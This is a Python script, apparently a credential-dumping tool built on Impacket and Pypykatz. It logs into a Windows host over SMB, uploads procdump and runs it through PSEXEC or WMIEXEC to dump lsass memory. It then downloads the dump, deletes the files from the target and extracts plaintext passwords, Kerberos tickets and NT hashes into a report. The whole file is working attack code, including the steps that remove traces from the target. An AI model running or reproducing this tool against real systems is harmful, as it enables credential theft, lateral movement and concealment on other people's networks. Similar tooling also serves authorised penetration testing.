#!/usr/bin/python3

######################Impacket###################################
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP

################################################################

from configuration import src_x32, src_x64
from argparse import Namespace
from psexec import PSEXEC
from wmiexec import WMIEXEC
from os import path
import re
import json
import os
import sys

#########################Pypykatz##############################

from pypykatz.utils.crypto.cmdhelper import CryptoCMDHelper
from pypykatz.ldap.cmdhelper import LDAPCMDHelper
from pypykatz.kerberos.cmdhelper import KerberosCMDHelper
from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
from pypykatz.registry.cmdhelper import RegistryCMDHelper
from pypykatz.remote.cmdhelper import RemoteCMDHelper

###############################################################


class Dumper:
    def __init__(self, username, password, domain, target, auth):
        self.target = target
        self.auth = auth
        if domain is None:
            domain = ""
        self.credentials = {
            "username": username,
            "password": password,
            "domain": domain,
        }
        self.smb = SMBConnection(self.target, self.target, sess_port=445, timeout=4)
        self.host_info = self.enum_host_info()

    def enum_host_info(self):
        print("Performing enumeration")
        info_dict = {}
        self.smb.login(
            user=self.credentials["username"],
            password=self.credentials["password"],
            domain=self.credentials["domain"],
        )
        os = self.smb.getServerOS()
        arch = self.get_arch()
        domain = self.smb.getServerDomain()
        info_dict.update({"target": self.target})
        info_dict.update({"os": os})
        info_dict.update({"domain": domain})
        info_dict.update({"arch": arch})
        print("Done")
        return info_dict

    def get_arch(self):
        options = Namespace()
        options.target = self.target
        NDR64Syntax = ("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0")
        try:
            stringBinding = r"ncacn_ip_tcp:%s[135]" % self.target
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(2)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=NDR64Syntax)
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    return 32
                else:
                    print(str(e))
                    pass
            else:
                return 64

            dce.disconnect()
        except Exception as e:
            print(f"{self.target}, {str(e)}")
            print(f"Failed to determine {self.target} architecture")
            print("Attempt to proceed with 32 bit procdump")
            return 32

    def upload_file(self):
        print("Uploading file")
        if self.host_info["arch"] == 64:
            src = src_x64
            filename = re.sub(r"\d+", "", path.basename(src))
            self.smb.putFile("C$", filename, open(src, "rb").read)
        elif self.host_info["arch"] == 32:
            src = src_x32
            filename = re.sub(r"\d+", "", path.basename(src))
            self.smb.putFile("C$", filename, open(src, "rb").read)
        else:
            print("Something went wrong")
            sys.exit(1)
        print("Done")

    def exec_procdump(self):
        print("Executing procdump")
        if self.auth == "psexec":
            # if self.host_info["arch"] == 64:
            #     executer = PSEXEC(
            #         "C:\\procdump.exe -accepteula C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
            #         None,
            #         None,
            #         None,
            #         int(445),
            #         self.credentials["username"],
            #         self.credentials["password"],
            #         self.credentials["domain"],
            #         None,
            #         None,
            #         False,
            #         None,
            #         "",
            #     )
            # else:
            #     executer = PSEXEC(
            #         "C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
            #         None,
            #         None,
            #         None,
            #         int(445),
            #         self.credentials["username"],
            #         self.credentials["password"],
            #         self.credentials["domain"],
            #         None,
            #         None,
            #         False,
            #         None,
            #         "",
            #     )
            # executer.run(
            #     remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
            # )
            executer = PSEXEC(
                "C:\\procdump.exe -accepteula",
                None,
                None,
                None,
                int(445),
                self.credentials["username"],
                self.credentials["password"],
                self.credentials["domain"],
                None,
                None,
                False,
                None,
                "",
            ).run(self.target, self.target)
            if self.host_info["arch"] == 64:
                executer = PSEXEC(
                    f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
                    None,
                    None,
                    None,
                    int(445),
                    self.credentials["username"],
                    self.credentials["password"],
                    self.credentials["domain"],
                    None,
                    None,
                    False,
                    None,
                    "",
                )
            else:
                executer = PSEXEC(
                    f"C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
                    None,
                    None,
                    None,
                    int(445),
                    self.credentials["username"],
                    self.credentials["password"],
                    self.credentials["domain"],
                    None,
                    None,
                    False,
                    None,
                    "",
                )
            executer.run(remoteName=self.target, remoteHost=self.target)
        elif self.auth == "wmiexec":
            #     if self.host_info["arch"] == 64:
            #         executer = WMIEXEC(
            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
            #             username=self.credentials["username"],
            #             password=self.credentials["password"],
            #             domain=self.credentials["domain"],
            #             hashes=None,
            #             aesKey=None,
            #             share="C$",
            #             noOutput=False,
            #             doKerberos=False,
            #             kdcHost=None,
            #         )
            #     else:
            #         executer = WMIEXEC(
            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
            #             username=self.credentials["username"],
            #             password=self.credentials["password"],
            #             domain=self.credentials["domain"],
            #             hashes=None,
            #             aesKey=None,
            #             share="C$",
            #             noOutput=False,
            #             doKerberos=False,
            #             kdcHost=None,
            #         )
            #     executer.run(self.host_info["target"])
            executer = WMIEXEC(
                command="C:\\procdump.exe -accepteula",
                username=self.credentials["username"],
                password=self.credentials["password"],
                domain=self.credentials["domain"],
                hashes=None,
                aesKey=None,
                share="C$",
                noOutput=False,
                doKerberos=False,
                kdcHost=None,
            ).run(self.target)
            if self.host_info["arch"] == 64:
                executer = WMIEXEC(
                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
                    username=self.credentials["username"],
                    password=self.credentials["password"],
                    domain=self.credentials["domain"],
                    hashes=None,
                    aesKey=None,
                    share="C$",
                    noOutput=False,
                    doKerberos=False,
                    kdcHost=None,
                )
            else:
                executer = WMIEXEC(
                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
                    username=self.credentials["username"],
                    password=self.credentials["password"],
                    domain=self.credentials["domain"],
                    hashes=None,
                    aesKey=None,
                    share="C$",
                    noOutput=False,
                    doKerberos=False,
                    kdcHost=None,
                )
            executer.run(self.target)
        print("Done")

    def dump_lsass(self):
        print("Dumping")
        self.smb.getFile("C$", "lsass_dump.dmp", open("lsass_dump.dmp", "wb").write)
        print("Done")

    def clear_out(self):
        print("Starting ClearOut")
        self.smb.deleteFile("C$", "lsass_dump.dmp")
        self.smb.deleteFile("C$", "procdump.exe")
        self.smb.close()
        print("ClearOut Done")

    @staticmethod
    def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
        print("Pypykatz doing his job...")

        cmdhelpers = [
            LSACMDHelper(),
            RegistryCMDHelper(),
            CryptoCMDHelper(),
            LDAPCMDHelper(),
            KerberosCMDHelper(),
            RemoteCMDHelper(),
        ]
        args = Namespace()
        args.cmd = "minidump"

        args.command = "lsa"
        args.directory = False
        args.halt_on_error = False
        args.json = True
        args.kerberos_dir = False
        args.memoryfile = dump_file
        args.outfile = "temp_report.json"
        args.recursive = False
        args.timestamp_override = None
        args.verbose = 0

        for helper in cmdhelpers:
            helper.execute(args)
        print("Removing dump file")
        os.remove(dump_file)
        print("Done")

    @staticmethod
    def create_report(filename, verbose):
        print("Creating report")
        with open("./temp_report.json", "r") as jf:
            parsed = json.load(jf)["./lsass_dump.dmp"]
            with open(filename, "w") as report:
                for el in parsed["logon_sessions"]:
                    temp = parsed["logon_sessions"][el]
                    if len(temp["kerberos_creds"]) > 0:
                        for cr in temp["kerberos_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    if verbose == 1:
                                        report.write(
                                            f"From Kerberos (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                        )
                                    else:
                                        report.write(
                                            f"{cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                        )
                                elif len(cr["tickets"]) > 0:
                                    if verbose == 1:
                                        report.write(
                                            f"From Kerberos (Domain/username:tickets) -- {cr['domainname']} / {cr['username']}:{cr['tickets']}\n"
                                        )
                                    else:
                                        report.write(
                                            f"Tickets--{cr['domainname']} / {cr['username']}:{cr['tickets']}\n"
                                        )
                    if len(temp["livessp_creds"]) > 0:
                        report.write("Did not expect creds to be in livessp\n")
                    if len(temp["ssp_creds"]) > 0:
                        for cr in temp["ssp_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    if verbose == 1:
                                        report.write(
                                            f"From SSP (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                        )
                                    else:
                                        report.write(
                                            f"{cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                        )
                    if len(temp["wdigest_creds"]) > 0:
                        for cr in temp["wdigest_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    if verbose == 1:
                                        report.write(
                                            f"From Wdigest (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                        )
                                    else:
                                        report.write(
                                            f"{cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                        )
                    if len(temp["msv_creds"]) > 0:
                        for cr in temp["msv_creds"]:
                            if cr["username"] is not None:
                                if cr["NThash"] is not None:
                                    if verbose == 1:
                                        report.write(
                                            f"From MSV (Domain/username:NThash) -- {cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
                                        )
                                    else:
                                        report.write(
                                            f"NTHASH--{cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
                                        )

                for el in parsed["orphaned_creds"]:
                    if "username" in el.keys() and el["username"] is not "":
                        if el["password"] is not None:
                            if verbose == 1:
                                report.write(
                                    f"From orphaned creds (Domain/username:password) -- {el['domainname']} / {el['username']}:{el['password']}\n"
                                )
                            else:
                                report.write(
                                    f"{el['domainname']} / {el['username']}:{el['password']}\n"
                                )
                        elif "tickets" in el.keys() and len(el["tickets"]) > 0:
                            if verbose == 1:
                                report.write(
                                    f"From orphaned creds (Domain/username:tickets) -- {el['domainname']} / {el['username']}:{el['tickets']}\n"
                                )
                            else:
                                report.write(
                                    f"Tickets--{el['domainname']} / {el['username']}:{el['tickets']}\n"
                                )
        os.remove("./temp_report.json")
        print("Done :)")

    def run(self):
        self.upload_file()
        self.exec_procdump()
        self.dump_lsass()
        self.clear_out()
